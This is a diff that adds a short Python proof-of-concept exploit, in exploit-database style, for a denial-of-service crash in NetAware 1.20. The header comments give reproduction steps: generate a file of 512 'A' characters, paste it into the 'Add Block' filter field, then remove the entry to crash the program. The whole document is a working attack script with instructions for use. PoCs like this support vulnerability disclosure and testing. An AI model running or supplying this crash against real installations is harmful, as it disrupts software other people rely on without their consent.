@@ -1,0 +1,22 @@
+# -*- coding: utf-8 -*-
+# Exploit Title: NetAware 1.20 - 'Add Block' Denial of Service (PoC)
+# Date: 22/05/2019
+# Author: Alejandra Sánchez
+# Vendor Homepage: https://www.infiltration-systems.com
+# Software: http://www.infiltration-systems.com/Files/netaware.zip
+# Version: 1.20
+# Tested on: Windows 7
+
+# Proof of Concept:
+# 1.- Run the python script 'NetAware.py', it will create a new file 'NetAware.txt'
+# 2.- Copy the text from the generated NetAware.txt file to clipboard
+# 3.- Open NetAware 
+# 4.- Go to 'Settings' > 'User Blocking'
+# 5.- Click 'Add Block', paste clipboard in the field 'Add a website or keyword to be filtered...' and click 'OK'
+# 6.- Select the block created and click 'Remove', you will see a crash
+
+buffer = "\x41" * 512
+
+f = open ("NetAware.txt", "w")
+f.write(buffer)
+f.close()
